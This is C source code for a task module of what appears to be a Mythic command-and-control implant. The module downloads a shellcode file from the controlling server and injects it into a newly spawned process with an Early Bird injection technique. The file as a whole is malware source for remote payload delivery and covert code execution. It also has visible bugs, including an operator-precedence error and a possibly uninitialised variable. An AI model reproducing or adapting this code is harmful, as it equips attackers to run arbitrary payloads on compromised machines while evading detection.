#include "Tasks/InjectShellcode.h"

#include "Package.h"
#include "Parser.h"
#include "Task.h"
#include "Config.h"
#include "Mythic.h"
#include "Inject.h"
#include "BeaconCompatibility.h"

/**
 * @brief Inject shellcode into process and return output
 * 
 * @param[in] taskUuid Task's UUID
 * @param[inout] arguments PARSER struct containing task data.
 * @return VOID
 */
VOID InjectShellcode(PCHAR taskUuid, PPARSER arguments)
{
    /* Parse BOF arguments */
    UINT32 nbArg = ParserGetInt32(arguments);
    _dbg("GOT %d arguments", nbArg);

    DWORD  Status;
    SIZE_T uuidLen              = 0;
    DWORD  filesize             = 0;
    MYTHIC_FILE Shellcode       = { 0 };

    PCHAR  fileUuid  = ParserGetString(arguments, &uuidLen);
    /*
        TODO:
            - Parse isProcessInjectKit
            - Parse Bytes for proc inject BOF
            - Get shellcode file
            - Call COFF with sc as param
    */


    strncpy(Shellcode.fileUuid, fileUuid, TASK_UUID_SIZE + 1);
    Shellcode.fileUuid[TASK_UUID_SIZE + 1] = '\0';

    _dbg("FOUND FILE UUID %s", Shellcode.fileUuid);

    /* Fetch file from Mythic using File UUID */
    if (Status = MythicGetFileBytes(taskUuid, &Shellcode) != 0)
    {
        _err("Failed to fetch file from Mythic server.");
        PackageError(taskUuid, Status);
        return;
    }

    unsigned char* Output = NULL;

    /* Spawn and Inject the Shellcode Stub into a Process */
    // TODO replace with injection HOOK
    if (!InjectProcessViaEarlyBird((PBYTE)Shellcode.buffer, Shellcode.size, &Output))
    {
        DWORD error = GetLastError();
        _err("[!] Failed to inject process with assembly shellcode. ERROR : %d\n", error);
        PackageError(taskUuid, error);
        goto END;
    }

    PPackage data = PackageInit(0, FALSE);
    PackageAddString(data, Output, FALSE);

    // Success
    PackageComplete(taskUuid, data);

END:
    // Cleanup
    if (Output) free(Output);
    LocalFree(Shellcode.buffer);          // allocated in MythicGetFileBytes()
    Shellcode.buffer = NULL;
    if (data) PackageDestroy(data);
}